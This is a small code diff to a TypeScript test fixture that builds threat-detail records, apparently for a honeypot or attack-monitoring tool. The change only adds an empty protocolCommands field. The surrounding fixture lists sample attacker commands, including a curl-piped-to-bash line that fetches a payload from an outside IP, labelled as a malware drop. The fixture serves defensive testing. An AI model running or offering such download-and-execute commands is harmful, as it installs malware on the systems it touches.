@@ -31,6 +31,7 @@ function baseThreat(over: Partial<ThreatDetail> = {}): ThreatDetail {
       { command: MDRFCKR_CMD, ts: "2026-06-15T10:00:05Z", category: "persistence" },
       { command: "curl -fsSL http://197.255.229.88:1987/fav.ico | bash", ts: "2026-06-15T10:00:10Z", category: "malware_drop" },
     ],
+    protocolCommands: [],
     ...over,
   }
 }
